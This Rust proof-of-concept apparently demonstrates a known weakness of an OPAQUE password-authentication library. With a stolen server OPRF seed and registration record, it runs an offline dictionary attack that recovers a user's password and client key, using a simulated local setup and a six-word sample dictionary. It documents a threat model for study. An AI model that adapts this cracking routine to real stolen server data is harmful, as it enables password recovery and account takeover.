// Demonstrates: offline dictionary attack with stolen server OPRF seed + registration record.
// Impact: recovers user password and unlocks envelope (client static key) without online guesses.
//
// Preconditions (server compromise):
// 1) Attacker has `oprf_seed`
// 2) Attacker has registration record bytes (envelope + client public key)
// 3) Attacker knows account_id and server public key

use opaque_agent::{create_registration_request, finalize_registration, InitiatorState, OpaqueInitiator, RegistrationRecord, RegistrationRequest};
use opaque_core::types::{
    Envelope, HASH_LENGTH, NONCE_LENGTH, OPRF_SEED_LENGTH, PRIVATE_KEY_LENGTH, PUBLIC_KEY_LENGTH,
    REGISTRATION_RECORD_LENGTH, SECRETBOX_MAC_LENGTH,
};
use opaque_core::{crypto, envelope, oprf, protocol};
use opaque_relay::{create_registration_response, OpaqueResponder, RegistrationResponse, ResponderKeyPair};

const ACCOUNT_ID: &[u8] = b"alice@example.com";

fn create_registration_record(password: &[u8], responder: &OpaqueResponder) -> Vec<u8> {
    let initiator = OpaqueInitiator::new(responder.public_key()).unwrap();
    let mut state = InitiatorState::new();
    let mut req = RegistrationRequest::new();
    create_registration_request(password, &mut req, &mut state).unwrap();

    let mut resp = RegistrationResponse::new();
    create_registration_response(responder, &req.data, ACCOUNT_ID, &mut resp).unwrap();

    let mut record = RegistrationRecord::new();
    finalize_registration(&initiator, &resp.data, &mut state, &mut record).unwrap();

    let mut out = vec![0u8; REGISTRATION_RECORD_LENGTH];
    protocol::write_registration_record(&record.envelope, &record.initiator_public_key, &mut out).unwrap();
    out
}

fn guess_password_offline(
    guess: &[u8],
    account_id: &[u8],
    stolen_oprf_seed: &[u8; OPRF_SEED_LENGTH],
    stolen_server_pk: &[u8; PUBLIC_KEY_LENGTH],
    registration_record: &[u8],
) -> bool {
    let parsed = protocol::parse_registration_record(registration_record).unwrap();

    let mut blinded = [0u8; PUBLIC_KEY_LENGTH];
    let mut blind = [0u8; PRIVATE_KEY_LENGTH];
    oprf::blind(guess, &mut blinded, &mut blind).unwrap();

    let mut oprf_key = [0u8; PRIVATE_KEY_LENGTH];
    crypto::derive_oprf_key(stolen_oprf_seed, account_id, &mut oprf_key).unwrap();

    let mut evaluated = [0u8; PUBLIC_KEY_LENGTH];
    oprf::evaluate(&blinded, &oprf_key, &mut evaluated).unwrap();

    let mut oprf_output = [0u8; HASH_LENGTH];
    oprf::finalize(guess, &blind, &evaluated, &mut oprf_output).unwrap();

    let mut randomized_pwd = [0u8; HASH_LENGTH];
    crypto::derive_randomized_password(&oprf_output, guess, &mut randomized_pwd).unwrap();

    let ct_size = parsed.envelope.len() - NONCE_LENGTH - SECRETBOX_MAC_LENGTH;
    let env = Envelope {
        nonce: parsed.envelope[..NONCE_LENGTH].to_vec(),
        ciphertext: parsed.envelope[NONCE_LENGTH..NONCE_LENGTH + ct_size].to_vec(),
        auth_tag: parsed.envelope[NONCE_LENGTH + ct_size..].to_vec(),
    };

    let mut recovered_rpk = [0u8; PUBLIC_KEY_LENGTH];
    let mut recovered_isk = [0u8; PRIVATE_KEY_LENGTH];
    let mut recovered_ipk = [0u8; PUBLIC_KEY_LENGTH];

    let opened = envelope::open(
        &env,
        &randomized_pwd,
        stolen_server_pk,
        &mut recovered_rpk,
        &mut recovered_isk,
        &mut recovered_ipk,
    )
    .is_ok();

    opened
        && recovered_rpk == *stolen_server_pk
        && recovered_ipk == parsed.initiator_public_key
}

fn main() {
    let real_password = b"correct horse battery staple";
    let stolen_oprf_seed = [0x42u8; OPRF_SEED_LENGTH];
    let keypair = ResponderKeyPair::generate().unwrap();
    let responder = OpaqueResponder::new(keypair, stolen_oprf_seed).unwrap();
    let registration_record = create_registration_record(real_password, &responder);

    // Simulated compromise artifacts.
    let stolen_server_pk = *responder.public_key();

    // Attacker dictionary (offline loop).
    let dictionary: [&[u8]; 6] = [
        b"123456",
        b"password",
        b"letmein",
        b"correct horse battery staple",
        b"qwerty",
        b"admin",
    ];

    let recovered = dictionary.iter().find(|guess| {
        guess_password_offline(
            guess,
            ACCOUNT_ID,
            &stolen_oprf_seed,
            &stolen_server_pk,
            &registration_record,
        )
    });

    match recovered {
        Some(password) => {
            println!("Recovered password offline: {}", String::from_utf8_lossy(password));
        }
        None => {
            println!("No match in dictionary");
        }
    }
}
